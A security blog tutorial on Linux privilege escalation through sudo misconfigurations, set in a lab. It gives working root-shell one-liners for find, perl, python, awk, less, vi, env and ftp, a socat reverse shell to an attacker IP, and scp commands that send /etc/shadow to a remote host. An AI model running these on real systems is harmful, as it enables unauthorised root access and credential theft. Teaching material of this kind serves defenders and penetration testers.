<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Linux Privilege Escalation using Sudo Rights</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/" rel="bookmark"><time class="entry-date published" datetime="2018-05-24T06:23:20+00:00">May 24, 2018</time><time class="updated" datetime="2025-06-08T12:45:42+00:00">June 8, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In our previous articles, we have discussed Linux Privilege Escalation using <span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">SUID Binaries</a> </span>and <span style="color: #3366ff;"><a style="color: #3366ff;" href="//www.hackingarticles.in/privilege-escalation-in-linux-using-etc-passwd-file/">/etc/passwd</a> </span>file and today we are posting another method of “Linux privilege Escalation using Sudoers file”. While solving CTF challenges, for privilege escalation we always check root permissions for any user to execute any file or command by executing <strong>sudo -l command</strong>. You can read our previous article where we had applied this trick for privilege escalation.</span></p>
<p class="ai-optimize-7"><span style="color: #000000;"><strong>Let’s Start with Theoretical Concept!!</strong></span></p>
<p class="ai-optimize-8"><span style="color: #000000;">In Linux/Unix, a sudoers file inside /etc is the configuration file for sudo rights. We all know the power of sudo command, the word sudo represent <span style="color: #800000;"><strong>S</strong>uper <strong>U</strong>ser <strong>D</strong>o root privilege task.</span> Sudoers file is that file where the users and groups with root privileges are stored to run some or all commands as root or another user. Take a look at the following image.</span></p>
<p class="ai-optimize-9"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-ai15msp43M8/WwZTT0rFHcI/AAAAAAAAXAk/8gow32i4VOEH9AcjKl5WCQrjiAeXU_K3gCLcBGAs/s1600/1.png"/></span></p>
<p class="ai-optimize-10"><span style="color: #000000;">When you run any command along with sudo, it needs root privileges for execution, Linux checks that particular username within the sudoers file. And it concluded, that the particular username is in the list of sudoers file or not, if not then you cannot run the command or program using the sudo command. As per sudo rights the root user can execute from <strong>ALL terminals</strong>, acting as <strong>ALL users</strong>: <strong>ALL group</strong>, and run <strong>ALL command</strong>.</span></p>
<h3 class="ai-optimize-11"><span style="color: #800000;">Sudoer File Syntax</span></h3>
<p class="ai-optimize-12"><span style="color: #000000;"><strong> </strong>If you (root user) wish to grant sudo right to any particular user then type <strong>visudo</strong> command which will open the sudoers file for editing. Under “user privilege specification” you will observe default root permission “<strong>root ALL=(ALL:ALL) ALL</strong>” BUT in actual, there is <strong>Tag option </strong>also available which is <strong>optional,</strong> as explained below in the following image.</span></p>
<p class="ai-optimize-13"><span style="color: #000000;">Consider the given example where we want to assign sudo rights for user:raaz to access the terminal and run copy command with root privilege. Here NOPASSWD tag that means no password will be requested for the user.</span></p>
<p class="ai-optimize-14"><span style="color: #000000;"><strong>NOTE: </strong></span></p>
<ol>
<li class="ai-optimize-15"><span style="color: #000000;">(ALL:ALL) can also represent as (ALL)</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">If you found (root) in place of (ALL:ALL) then it denotes that user can run the command as root.</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">If nothing is a mention for user/group then it means sudo defaults to the root user.</span></li>
</ol>
<p class="ai-optimize-18"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-7HdHllzAXZU/WwZTV0yMDYI/AAAAAAAAXBA/6gOuaUG5b70GfAgtusuMxqPpX5Ji1rRCgCLcBGAs/s1600/2.1.png"/></span></p>
<p class="ai-optimize-19"><span style="color: #000000;"><strong>Let’s Begin!!</strong></span></p>
<p class="ai-optimize-20"><span style="color: #000000;">Let’s get into deep through practical work. First, create a user which should be not the sudo group user. Here we have added user “raaz” who’s UID is 1002 and GID is 1002 and hence raaz is non-root user.</span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong> <img decoding="async" src="//4.bp.blogspot.com/-tNdRkLfQ2nY/WwZTWlBpKvI/AAAAAAAAXBM/5F70LWFsLzkRXxJnUgg71dMenx8t511oACLcBGAs/s1600/2.png"/></strong></span></p>
<h3 class="ai-optimize-22"><span style="color: #800000;">Traditional Method to assign Root Privilege  </span></h3>
<p class="ai-optimize-23"><span style="color: #000000;">If the system administrator wants to give ALL permission to user raaz then he can follow the below steps to add user raaz under User Privilege Specification category.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">visudo
raaz ALL=(ALL:ALL) ALL
or
raaz ALL=(ALL) ALL</pre>
<p class="ai-optimize-24"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-8gR4nPSYyN4/WwZTYl9f9gI/AAAAAAAAXBw/z07NheXnc9g2zwdl28IyMfC60QGcMoubwCLcBGAs/s1600/3.png"/></span></p>
<h3 class="ai-optimize-25"><span style="color: #800000;">Spawn Root Access </span></h3>
<p class="ai-optimize-26"><span style="color: #000000;">On other hands start your attacking machine and first compromise the target system and then move to privilege escalation phase. Suppose you successfully login into victim’s machine through ssh and want to know sudo rights for the current user then execute below command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-27"><span style="color: #000000;">In the traditional method, PASSWD option is enabled for user authentication while executing the above command and it can be disabled by using NOPASSWD tag. The highlighted text is indicating that the current user is authorized to execute all command. Therefore we have obtained root access by executing the command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo su
id</pre>
<p class="ai-optimize-28"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-PaDxpIQHpC0/WwZTYh9QDeI/AAAAAAAAXB0/RDKrrFIzhZIvjFzzK3mruBWajVmnO_XPgCLcBGAs/s1600/4.png"/></span></p>
<h3 class="ai-optimize-29"><span style="color: #800000;">Default Method to assign Root Privilege  </span></h3>
<p class="ai-optimize-30"><span style="color: #000000;">If the system administrator wants to give root permission to user raaz to execute all command and program then he can follow below steps to add user raaz under User Privilege Specification category.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">visudo
raaz ALL=ALL
or
raaz ALL=(root) ALL</pre>
<p class="ai-optimize-31"><span style="color: #000000;">Here also Default PASSWD option is enabled for authentication.</span></p>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-0nLnf6gx1Pg/WwZTZJFCoXI/AAAAAAAAXB4/2M6_S8Xe7n09E_QRSIsg3uoQSUbgKJLnACLcBGAs/s1600/5.png"/></span></p>
<h3 class="ai-optimize-33"><span style="color: #000000;"><span style="color: #800000;">Spawn Root Access</span> </span></h3>
<p class="ai-optimize-34"><span style="color: #000000;">Again compromise the target system and then move for privilege escalation stage as done above and execute the below command to view sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-35"><span style="color: #000000;">Here you can perceive the highlighted text which is representative that the user raaz can run all command as root user. Therefore we can achieve root access by performing further down steps.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo su
or
sudo bash</pre>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>Note:</strong> Both methods above will ask user’s password for authentication at the time of execution of <strong>sudo -l </strong>command because by Default PASSWD option is enabled.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-KXDRut3kQus/WwZTZNK3NNI/AAAAAAAAXB8/RRF95tp-9NAU_EAfMLLvwjuP6oNEdbbHQCLcBGAs/s1600/7.png"/></span></p>
<h3 class="ai-optimize-38"><span style="color: #800000;">Allow Root Privilege to Binary commands</span></h3>
<p class="ai-optimize-39"><span style="color: #000000;">Sometimes the user has the authorization to execute any file or command of a particular directory such as /bin/cp, /bin/cat or /usr/bin/ find, this type of permission lead to privilege escalation for root access and it can be implemented with help of following steps.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raaz ALL=(root) NOPASSWD: /usr/bin/find</pre>
<p class="ai-optimize-40"><span style="color: #000000;"><strong> </strong><strong>NOTE: </strong>Here NOPASSWD tag that means no password will be requested for the authentication while running sudo -l command.</span></p>
<p class="ai-optimize-41"><span style="color: #000000;"><strong> <img decoding="async" src="//3.bp.blogspot.com/-Tk94o7a16NE/WwZTZV-l89I/AAAAAAAAXCA/XZbgrAJlBj0uFGo0fkqW_aCUFqc3WFtawCLcBGAs/s1600/9.png"/></strong></span></p>
<h3 class="ai-optimize-42"><span style="color: #800000;">Spawn Root Access using Find Command</span></h3>
<p class="ai-optimize-43"><span style="color: #000000;">Again compromised the Victim’s system and then move for privilege escalation phase and execute below command to view sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-44"><span style="color: #000000;">At this point, you can notice the highlighted text is indicating that the user raaz can run any command through find command. Therefore we got root access by executing below commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo find /home -exec /bin/bash \;
id</pre>
<p class="ai-optimize-45"><span style="color: #000000;"><strong><img decoding="async" src="//2.bp.blogspot.com/-B_Boz4ArL8o/WwZTT9bCHpI/AAAAAAAAXAg/9tx9bbHfPXsuG5bir2fBSGRukd5ucTDHgCLcBGAs/s1600/11.png"/> </strong></span></p>
<h3 class="ai-optimize-46"><span style="color: #800000;">Allow Root Privilege to Binary Programs</span></h3>
<p class="ai-optimize-47"><span style="color: #000000;">Sometimes admin assigns delicate authorities to a particular user to run binary programs which allow a user to edit any system files such as /etc/passwd and so on. There are certain binary programs which can lead to privilege escalation if authorized to a user. In given below command we have assign sudo rights to the following program which can be run as root user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raaz ALL= (root) NOPASSWD: /usr/bin/perl, /usr/bin/python, /usr/bin/less, /usr/bin/awk, /usr/bin/man, /usr/bin/vi</pre>
<p class="ai-optimize-48"><span style="color: #000000;"><img decoding="async" src="//4.bp.blogspot.com/-GKkj4eDCVBc/WwZTT_mo7XI/AAAAAAAAXAc/iLxoOjqCJl4LPJKwcYgPXp3tiWNUHzv-QCLcBGAs/s1600/12.png"/></span></p>
<h3 class="ai-optimize-49"><span style="color: #800000;">Spawn shell using Perl</span></h3>
<p class="ai-optimize-50"><span style="color: #000000;">At the time of privilege, escalation phase executes below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-51"><span style="color: #000000;">Now you can observe the highlighted text is showing that the user raaz can run Perl language program or script as root user. Therefore we got root access by executing Perl one-liner.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo perl -e 'exec "/bin/bash";'
id</pre>
<p class="ai-optimize-52"><span style="color: #000000;"><strong><img decoding="async" src="//1.bp.blogspot.com/-I1TaJ-ZVUbw/WwZTUtk6LXI/AAAAAAAAXAs/5Zl9NdRrDwkIxg1fsJHpkRHySvDT6GZkwCLcBGAs/s1600/13.png"/></strong></span></p>
<h3 class="ai-optimize-53"><span style="color: #800000;"><strong>Spawn shell using Python</strong></span></h3>
<p class="ai-optimize-54"><span style="color: #000000;">After compromising the target system and then move for privilege escalation phase as done above and execute the below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-55"><span style="color: #000000;">At this point, you can perceive the highlighted text is indicating that the user raaz can run Python language program or script as root user. Thus we acquired root access by executing Python one-liner.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo python -c 'import pty;pty.spawn("/bin/bash")'
id</pre>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-ybEFrJq8PR0/WwZTUT_VSTI/AAAAAAAAXAo/hs0x2CTUL0kGd4VXdEreic4Ea0ovg_AwgCLcBGAs/s1600/14.png"/></span></p>
<h3 class="ai-optimize-57"><span style="color: #800000;">Spawn shell using Less Command</span></h3>
<p class="ai-optimize-58"><span style="color: #000000;">For the privilege, escalation phase executes below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-pwLd4I0nS78/WwZTUlPjQwI/AAAAAAAAXAw/Gok_4ZpheUoN2lJ961XyyPixI3bfzaHGwCLcBGAs/s1600/16.png"/></p>
<p class="ai-optimize-59"><span style="color: #000000;">Here you can observe the highlighted text which is indicating that the user raaz can run less command as root user. Hence we obtained root access by executing the following.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo less /etc/hosts</pre>
<p class="ai-optimize-60"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-WakRShQRD_s/WwZTVC_bh4I/AAAAAAAAXA0/8trMMtN0fWo-fghXJJjo1ZVnlYhX8dc7wCLcBGAs/s1600/17.png"/></span></p>
<p class="ai-optimize-61"><span style="color: #000000;">It will open requested system file for editing, BUT for spawning root shell type <strong>!bash</strong> as shown below and hit enter.</span></p>
<p class="ai-optimize-62"><span style="color: #000000;">You will get root access as shown in the below image.</span></p>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-awIMJQqnZ4o/WwZTVX6T8VI/AAAAAAAAXA4/Ra1nm_ItAJ4dwOdNtFkRJgIaDOwAbRkRgCLcBGAs/s1600/18.png"/></span></p>
<h3 class="ai-optimize-64"><span style="color: #800000;"><strong>Spawn shell using AWK</strong></span></h3>
<p class="ai-optimize-65"><span style="color: #000000;">After the compromise, the target system then moves for privilege escalation phase as done above and execute the below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-66"><span style="color: #000000;">At this phase, you can notice the highlighted text is representing that the user raaz can run AWK language program or script as root user. Therefore we obtained root access by executing AWK one-liner.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo awk 'BEGIN {system("/bin/bash")}'
id</pre>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-3z4d9NLyZDY/WwZTVdOxolI/AAAAAAAAXA8/MNXLKudiLMYK46u-v2_HZCtCE66OYNupgCLcBGAs/s1600/19.png"/></span></p>
<h3 class="ai-optimize-68"><span style="color: #800000;"><strong>Spawn shell using Man Command (Manual page) </strong></span></h3>
<p class="ai-optimize-69"><span style="color: #000000;">For privilege escalation and execute below command to view sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-70"><span style="color: #000000;">Here you can observe the highlighted text is indicating that the user raaz can run man command as root user. Therefore we got root access by executing the following.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo man man</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-Ga7s49HvIwk/WwZTWXR7FqI/AAAAAAAAXBE/GP0HgHi5REwrjiAxvJn4kU1-g3-hHsKDACLcBGAs/s1600/20.png"/></span></p>
<p class="ai-optimize-72"><span style="color: #000000;">It will be displaying Linux manual pages for editing, BUT for spawning root shell type <strong>!bash</strong> as presented below and hit enter, you get root access as done above using Less command.</span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="//1.bp.blogspot.com/-OtJcnU-fFes/WwZTWSvUeQI/AAAAAAAAXBI/TEDWwTP4YLY8ggD-FqGTEB29NuCihVj3ACLcBGAs/s1600/21.png"/></span></p>
<p class="ai-optimize-74"><span style="color: #000000;">You will get root access as shown in the below image.</span></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-nPNaM0oVeJQ/WwZjoTQRCsI/AAAAAAAAXCk/SMB8EqA2qQgevyIUvQhQ7PesVzOFyG1_gCLcBGAs/s1600/24.png"/></p>
<h3 class="ai-optimize-75"><span style="color: #800000;"><strong>Spawn shell using Vi-editor (Visual editor) </strong></span></h3>
<p class="ai-optimize-76"><span style="color: #000000;">After compromising the target system and then move for privilege escalation phase as done above and execute the below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-77"><span style="color: #000000;">Here you can observe the highlighted text which is indicating that user raaz can run vi command as root user. Consequently, we got root access by executing the following.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo vi</pre>
<p><img decoding="async" src="//4.bp.blogspot.com/-jPyDZ5nFYEw/WwZTWwrFqMI/AAAAAAAAXBQ/Ouvc7z5hqw0XQXbhPYuz16IdvUzLwvQSgCLcBGAs/s1600/22.png"/></p>
<p class="ai-optimize-78"><span style="color: #000000;">Thus, It will open vi editors for editing, BUT for spawning root shell type <strong>!bash</strong> as shown below and hit enter, you get root access as done above using Less command.</span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-U2diXcQMxs0/WwZTW47RU-I/AAAAAAAAXBU/hgSzbDISebsa5HZsiF1-t7ZaSBVQv_RNgCLcBGAs/s1600/23.png"/></span></p>
<p class="ai-optimize-80"><span style="color: #000000;">You will get root access as shown in the below image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">id
whoami</pre>
<p class="ai-optimize-81"><span style="color: #000000;"><strong>NOTE: </strong>sudo permission for less, nano, man, vi and man is very dangerous as they allow the user to edit system file and lead to Privilege Escalation. </span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><strong> <img decoding="async" src="//2.bp.blogspot.com/-ZDKThMqVdHQ/WwZTXDs21yI/AAAAAAAAXBY/ute2d8OVU6I39Yo-d8FQ-g-vGo6JRi_XgCLcBGAs/s1600/24.png"/></strong></span></p>
<h3 class="ai-optimize-83"><span style="color: #800000;"> Allow Root Privilege to Shell Script</span></h3>
<p class="ai-optimize-84"><span style="color: #000000;">There are maximum chances to get any kind of script for the system or program call, it can be any script either Bash, PHP, Python or C language script. Suppose you (system admin) want to give sudo permission to any script which will provide bash shell on execution.</span></p>
<p class="ai-optimize-85"><em><span style="color: #000000;">For example, we have some scripts which will provide root terminal on execution, in given below image you can observe that we have written 3 programs for obtaining bash shell by using different programing language and saved all three files: <strong>asroot.py, asroot.sh, asroot.c </strong>(compiled file <strong>shell</strong>) inside bin/script.</span></em></p>
<p class="ai-optimize-86"><span style="color: #000000;"><strong>NOTE:</strong> While solving OSCP challenges you will find that some script is hidden by the author for exploit kernel or for root shell and set sudo permission to any particular user to execute that script.</span></p>
<p class="ai-optimize-87"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/-j6xIQCMa72I/WwZTXaOYcVI/AAAAAAAAXBc/Jnpts2JpoHIebObctZKpJJiXhDkpCKkoQCLcBGAs/s1600/25.png"/></span></p>
<p class="ai-optimize-88"><span style="color: #000000;">Now allow raaz to run all above script as root user by editing sudoers file with the help of the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raaz ALL= (root) NOPASSWD: /bin/script/asroot.sh, /bin/script/asroot.py, /bin/script/shell</pre>
<p class="ai-optimize-89"><span style="color: #000000;"><strong><img decoding="async" src="//2.bp.blogspot.com/-mqbztNiaMww/WwZTXhfoGCI/AAAAAAAAXBg/xXqwJiwJA7oOPF1HDPURKOLSGMPFk7MYgCLcBGAs/s1600/26.png"/></strong></span></p>
<h3 class="ai-optimize-90"><span style="color: #800000;">Spawn root shell by Executing Bash script</span></h3>
<p class="ai-optimize-91"><span style="color: #000000;">For the privilege, escalation phase executes below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-92"><span style="color: #000000;">The highlighted text is indicating that the user raaz can run asroot.sh as the root user. Therefore we got root access by running asroot.sh script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /bin/script/asroot.sh
id</pre>
<p class="ai-optimize-93"><span style="color: #000000;"><strong><img decoding="async" src="//1.bp.blogspot.com/-nloPAfhDgcQ/WwZTX8GnfxI/AAAAAAAAXBk/5IOM2UUB6rA-u1QCkhxfCFBw0587QtMZwCLcBGAs/s1600/27.png"/></strong></span></p>
<h3 class="ai-optimize-94"><span style="color: #800000;">Spawn root shell by Executing Python script</span></h3>
<p class="ai-optimize-95"><span style="color: #000000;">Execute below command for privilege escalation to view sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-96"><span style="color: #000000;">At this time the highlighted text is showing that user raaz can run asroot.py as the root user. Therefore we acquired root access by executing the following script.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /bin/script/asroot.py
id</pre>
<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="//2.bp.blogspot.com/--MPkOtDjETQ/WwZTYJ0zZCI/AAAAAAAAXBo/avWmmoOzn5EqhsC4992AZX4lscY9jH6YACLcBGAs/s1600/28.png"/></span></p>
<h3 class="ai-optimize-98"><span style="color: #800000;">Spawn root shell by Executing C Language script</span></h3>
<p class="ai-optimize-99"><span style="color: #000000;">After compromising the target system and then move for privilege escalation and execute below command to view the sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-100"><span style="color: #000000;">Here you can perceive the highlighted text is indicating that the user raaz can run shell (asroot.c compiled file) as the root user. So we obtained root access by executing the following shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /bin/script/shell
id</pre>
<p class="ai-optimize-101"><span style="color: #000000;"><img decoding="async" src="//3.bp.blogspot.com/-VPe-tKOmB1Q/WwZTYTF5yII/AAAAAAAAXBs/x4LLW7vB--sErAKEOv1tse1hCh7nEJhAgCLcBGAs/s1600/29.png"/></span></p>
<h3 class="ai-optimize-102"><span style="color: #800000;"><strong>Allow Sudo Right to other Programs</strong></span></h3>
<p class="ai-optimize-103"><span style="color: #000000;">As we have seen above, some binary programs with sudo right are helpful in getting root access. But apart from that, there are some application which can also provide root access if owned sudo privilege such as FTP or socat.  In given below command we have assign sudo rights to the following program which can be run as root user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">raaz ALL=(ALL) NOPASSWD: /usr/bin/env, /usr/bin/ftp, /usr/bin/scp, /usr/bin/socat</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-J8xJCvskWHQ/W3BOhzc1seI/AAAAAAAAZsA/Emu2n-Fn4VYgh7Dz2epWMeve1sscjpL8QCLcBGAs/s1600/0.png"/></p>
<h3 class="ai-optimize-104"><span style="color: #800000;">Spawn Shell Using Env</span></h3>
<p class="ai-optimize-105"><span style="color: #000000;"> At the time of privilege escalation phase, executes below command to view sudo user list.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
<p class="ai-optimize-106"><span style="color: #000000;">As we can observe user: raaz has sudo rights for env, FTP, SCP, and Socat, now let’s try to get root access through them one-by-one.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo env /bin/bash
whoami</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-22D-TwyJWNQ/W3BOh6zBgfI/AAAAAAAAZsE/gw_YjVSig0kUa4xnzV_yGo2fqHJpGmkSgCLcBGAs/s1600/1.png"/></p>
<h3 class="ai-optimize-107"><span style="color: #800000;">Spawn Shell Using FTP</span></h3>
<p class="ai-optimize-108"><span style="color: #000000;">Now let’s try to get root access through FTP with the help of following commands:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo ftp
! /bin/bash
whoami
or
! /bin/sh
id
whoami</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-5vW-UNCSNfc/W3BOhk_4VFI/AAAAAAAAZr8/uslfJKdfJTUr372x6TUJcmLeCwC3CvPQgCLcBGAs/s1600/2.png"/></p>
<h3 class="ai-optimize-109"><span style="color: #800000;">Spawn Shell Using Socat</span></h3>
<p class="ai-optimize-110"><span style="color: #000000;">Now let’s try to get root access through socat with the help of following commands. Execute below command on the attacker’s terminal in order to enable listener for reverse connection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat file:`tty`,raw,echo=0 tcp-listen:1234</pre>
<p class="ai-optimize-111"><span style="color: #000000;">Then run the following command on victim’s machine and you will get root access on your attacker machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234</pre>
<p><img decoding="async" src="//3.bp.blogspot.com/-XmeRwflSsa0/W3BOic6vYDI/AAAAAAAAZsI/RBCsUYCUSIsvOiZKHFgTf7RGNhWenFXUgCLcBGAs/s1600/3.png"/></p>
<p><img decoding="async" src="//1.bp.blogspot.com/-n0edo3JPYHo/W3BOiyL2eiI/AAAAAAAAZsM/cmDdirECHVQarLdRvIH-TuGPCgHVpPVdQCLcBGAs/s1600/4.png"/></p>
<h3 class="ai-optimize-112"><span style="color: #800000;">Spawn shell through SCP </span></h3>
<p class="ai-optimize-113"><span style="color: #000000;">As we know sudo right is available for SCP but it is not possible to get bash shell directory as shown above because it is a means of securely moving any files between a local host and a remote host. Therefore we can use it for transferring those system files which requires root permission to perform read/write operation such as /etc/passwd and /etc/shadow files.</span></p>
<p class="ai-optimize-114"><span style="color: #000000;"><strong>Syntax:</strong> scp SourceFile user@host:~/path of the directory</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo scp /etc/passwd aarti@192.168.1.105:~/
sudo scp /etc/shadow aarti@192.168.1.105:~/</pre>
<p><img decoding="async" src="//2.bp.blogspot.com/-bgqCwS-nO2U/W3BOi0DwLII/AAAAAAAAZsQ/n-GROVJPMQkk9uXXDju8Z_-iObdOQ9xdgCLcBGAs/s1600/5.png"/></p>
<p class="ai-optimize-115"><span style="color: #000000;">Now let’s confirm the transformation by inspecting remote directory and as you can observe we have successfully received passwd and shadow files in our remote pc.</span></p>
<p><img decoding="async" src="//2.bp.blogspot.com/-hyZICA9iHdU/W3BOjF4188I/AAAAAAAAZsU/EZeXDQq6mBsqdWtwlMEqTY8SKSrLPEy1ACLcBGAs/s1600/6.png"/></p>
<p class="ai-optimize-116"><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
